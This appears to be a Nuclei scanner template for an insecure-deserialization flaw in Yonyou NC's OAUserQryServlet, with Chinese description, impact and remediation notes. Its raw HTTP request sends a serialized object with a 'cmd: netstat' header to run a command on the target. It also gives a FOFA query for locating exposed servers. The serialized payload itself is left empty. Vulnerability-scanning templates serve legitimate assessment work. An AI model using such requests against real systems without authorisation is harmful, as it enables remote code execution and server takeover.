id: yonyou-nc-oauserqryservlet-deserialization

info:
  name: Yonyou NC OAUserQryServlet - Insecure Deserialization (Potential RCE)
  author: qwtd
  severity: critical
  description: |
    用友 NC（常见为 NC 6.5 / NC Cloud 系列）OAUserQryServlet 组件存在不安全的 Java 反序列化风险。
    若接口在未做严格鉴权/过滤的情况下对用户可控数据进行反序列化，攻击者可构造恶意序列化对象触发服务端代码执行（RCE），
    进而导致服务器被接管、数据泄露或业务中断。
  remediation: |
    1) 优先：安装厂商安全补丁/升级到修复版本（如厂商已发布公告/修复包）。
    2) 临时缓解：限制 OAUserQryServlet 相关路径对公网暴露（仅内网/管理网访问），并在网关/WAF 层拦截可疑序列化流量。
    3) 代码/配置层：避免对不可信输入直接反序列化；启用反序列化白名单/类过滤；移除不必要的第三方 gadget 依赖。
  impact: |
    未授权攻击者可能远程触发反序列化利用链，执行任意代码/命令，写入后门，获取服务器权限，
    进一步造成敏感信息泄露、业务系统被篡改或不可用。
  reference:
    - https://mrxn.net/jswz/yonyou-OAUserQryServlet-rce-sqli.html
  classification:
    cwe-id: CWE-502
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    vendor: yonyou
    product: ufida-nc
    verified: false
    max-request: 1
    fofa-query: app="用友-UFIDA-NC" || (title="Yonyou NC" || title="产品登录界面")
  tags: 用友-NC-Cloud,Yonyou-UFIDA-NC

http:
  - raw:
      - |
        POST /servlet/OAUserQryServlet?pageId=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-java-serialized-object
        cmd: netstat

        {{base64_decode('')}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'ESTABLISHED'

      - type: status
        status:
          - 200